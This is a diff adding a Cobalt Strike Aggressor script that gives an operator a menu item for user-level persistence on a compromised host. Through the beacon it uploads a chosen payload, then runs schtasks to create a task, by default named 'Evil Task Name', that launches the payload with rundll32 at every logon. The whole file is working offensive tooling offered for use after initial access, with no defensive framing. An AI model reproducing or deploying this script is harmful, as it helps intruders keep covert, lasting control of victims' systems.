@@ -1,0 +1,38 @@
+#User Schtasks Persistence
+#Author: @Qu1nn
+#Runs as current user for the selected beacon
+#Meant for quick user level persistence upon initial access
+#Thanks to @noone and bluescreenofjeff for help
+
+sub persistUserSchtasks  {
+	$bid = $1;
+
+	$dialog = dialog("User Schtasks Persistence", %(taskname => "Evil Task Name..", targetpath => "Target Path..", payloadfile => "Select.."), lambda({
+		if ("$3['taskname']" ismatch 'Evil Task Name..' || "$3['targetpath']" ismatch 'Target Path..' || "$3['payloadfile']" ismatch 'Select..') {
+			berror($bid, "\c4Please enter a valid Task Name, Target Path, and a valid Payload File.");
+			break;
+		}
+		else {
+			bcd($bid, $3['targetpath']);
+			bupload($bid, $3['payloadfile']);
+			bshell($bid, 'schtasks /create /tn "'.$3['taskname'].'" /tr "C:\Windows\System32\rundll32.exe '.$3['targetpath'].split("/",$3['payloadfile'])[-1].',StartW" /sc onlogon');
+			bshell($bid, 'schtasks /query /v /tn "'.$3['taskname'].'" /FO list');
+		}
+	}));
+
+	dialog_description($dialog, "User Schtasks Persistence - Generates a schtask for persistence on selected beacon. **Persistence won't work running as SYSTEM**");
+	
+	drow_text($dialog, "taskname",  "Schtasks Taskname:");
+	drow_text($dialog, "targetpath", "Target Path:");
+	drow_file($dialog, "payloadfile", "Payload:");
+	
+	dbutton_action($dialog, "Ok");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "User Schtasks Persistence" {
+		persistUserSchtasks($1);
+	}
+} 
